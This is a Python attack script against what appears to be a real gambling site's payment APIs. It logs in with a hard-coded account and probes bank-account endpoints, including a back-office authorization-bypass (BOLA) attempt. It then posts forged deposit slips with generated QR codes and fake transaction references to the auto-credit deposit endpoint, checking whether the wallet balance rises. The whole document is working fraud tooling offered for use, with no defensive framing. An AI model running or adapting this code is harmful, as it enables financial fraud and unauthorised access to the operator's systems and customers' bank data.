#!/usr/bin/env python3
"""probe_we88c_banks.py — Get we88c payment bank accounts and deposit.

   we88c auto-credits deposits (confirmed in session context).
   Need to find the correct bank account IDs for we88c.
"""
import base64, json, pathlib, requests, sys, time

sys.path.insert(0, "nuxt")
from slipgen3 import generate_tx_reference, generate_qr_data
from datetime import datetime, timezone, timedelta

TID    = "54ef7626cb381f4bab8be91f0cdbce47"
PBAPI  = f"https://{TID}pbapi.asdgapicenterssdo.com"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
BGAPI  = f"https://{TID}bgapi.asdgapicenterssdo.com"
DOMAIN = "m.we88c.com"

PHONE = "0972571110"
PASS  = "Pwned2026!"

# Auth
r = requests.post(f"{PBAPI}/pb/authentication",
    headers={"Content-Type": "application/json", "template": "vn"},
    json={"strategy": "local", "username": PHONE, "password": PASS},
    timeout=15)
if r.status_code not in (200, 201):
    print(f"Auth failed: {r.status_code}: {r.text[:100]}")
    exit(1)
JWT = r.json()["accessToken"]
print(f"JWT OK (sub={r.json().get('id','?')[:8]})")

HDR = {"Authorization": f"Bearer {JWT}", "template": "vn",
       "Content-Type": "application/json"}

def wallet():
    r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR, timeout=10)
    if r.ok:
        data = r.json().get("data", [{}])
        return data[0].get("balance", "?") if isinstance(data, list) else "?"
    return f"ERR:{r.status_code}"

print(f"wallet: {wallet()}\n")

# ── 1. Get payment bank accounts via various endpoints ─────────────────────────
print("=== 1. Find we88c payment bank accounts ===")

# Try mgapi endpoints first
for path in ["/mb/bank-information", "/mb/payment-bank-information",
             "/mb/deposit-bank", "/mb/bank-account", "/mb/deposit/bank-info"]:
    r = requests.get(f"{MGAPI}{path}", headers=HDR, timeout=10)
    if r.status_code not in (404,):
        print(f"  GET {path}: HTTP {r.status_code}")
        if r.ok:
            try:
                items = r.json() if isinstance(r.json(), list) else r.json().get("data", [])
                if items:
                    print(f"    {len(items)} items")
                    for item in items[:5]:
                        print(f"      {item}")
            except Exception as e:
                print(f"    parse: {e}: {r.text[:100]}")

# Try pbapi
for path in ["/pb/bank-informations", "/pb/payment-bank-informations",
             "/pb/deposit-banks", "/pb/bank-accounts"]:
    r = requests.get(f"{PBAPI}{path}",
                     headers={"Authorization": f"Bearer {JWT}"},
                     params={"domain": DOMAIN, "$limit": 20},
                     timeout=10)
    if r.status_code not in (404,):
        print(f"  GET {path}: HTTP {r.status_code}")
        if r.ok:
            try:
                items = r.json() if isinstance(r.json(), list) else r.json().get("data", [])
                if items:
                    print(f"    {len(items)} items")
                    for item in items[:5]:
                        bid = item.get("id", "?")
                        bno = item.get("bank_no") or item.get("account_no") or ""
                        btype = item.get("payment_type_code") or item.get("bank_code") or "?"
                        print(f"      {bid[:8] if isinstance(bid,str) else bid} | {btype} | {bno}")
            except Exception as e:
                print(f"    parse: {e}: {r.text[:100]}")

# Try bgapi BOLA (might work on we88c)
for path in ["/bo/info/payment-bank-account", "/bo/info/bank-information",
             "/bo/info/bank-deposit", "/bo/info/deposit-bank-information"]:
    r = requests.get(f"{BGAPI}{path}",
                     headers={"Authorization": f"Bearer {JWT}", "template": "vn"},
                     params={"domain": DOMAIN},
                     timeout=10)
    if r.status_code not in (404,):
        print(f"  GET {path}: HTTP {r.status_code}")
        if r.ok:
            try:
                items = r.json() if isinstance(r.json(), list) else r.json().get("data", [])
                if items:
                    print(f"    {len(items)} items")
                    for item in items[:10]:
                        bid = item.get("id", "?")
                        bno = item.get("bank_no") or item.get("account_no") or ""
                        btype = item.get("payment_type_code") or item.get("bank_code") or "?"
                        bname = item.get("payment_name", "?")
                        active = item.get("is_active", "?")
                        if isinstance(bid, str) and len(bid) > 8:
                            print(f"      {bid[:8]} | {btype:15} | {bname:20} | bank_no={bno}")
            except Exception as e:
                print(f"    parse: {e}: {r.text[:200]}")

# ── 2. Check pbapi users service for deposit config ───────────────────────────
print("\n=== 2. Check user profile for deposit config ===")
r = requests.get(f"{PBAPI}/pb/users",
                 headers={"Authorization": f"Bearer {JWT}"},
                 params={"domain": DOMAIN, "$limit": 1},
                 timeout=10)
if r.ok:
    try:
        items = r.json() if isinstance(r.json(), list) else r.json().get("data", [])
        if items:
            user = items[0]
            print(f"  User: {user.get('id','?')[:8]}")
            for key in ["deposit_account_id", "payment_bank_information_id",
                        "bank_account_id", "deposit_config"]:
                if key in user:
                    print(f"    {key}: {user[key]}")
    except Exception:
        pass

# ── 3. Try deposit with various bank IDs ──────────────────────────────────────
print("\n=== 3. Test deposit with various bank IDs ===")
now = datetime.now(timezone.utc) + timedelta(hours=7)
tx_ref = generate_tx_reference(now)
qr = generate_qr_data(tx_ref)
print(f"  Fresh QR: {tx_ref}")

# Common/generic bank IDs to try
test_bank_ids = [
    "",  # empty - let server pick
    "auto",  # special value
    "default",
]

for bank_id in test_bank_ids:
    payload = {
        "deposit_amount": 100,
        "note": "$",
        "slip_image_url": f"slip_{tx_ref[:8]}.jpg",
        "qr_string": qr,
    }
    if bank_id:
        payload["payment_bank_information_id"] = bank_id

    r = requests.post(f"{MGAPI}/mb/auto-slip-deposit", headers=HDR,
                      json=payload, timeout=15)
    print(f"  bank_id={bank_id or '<none>'}: HTTP {r.status_code}: {r.text[:120]}")
    if r.ok:
        print(f"    [!!!] SUCCESS! wallet: {wallet()}")
    time.sleep(0.5)

print(f"\nFINAL wallet: {wallet()}")
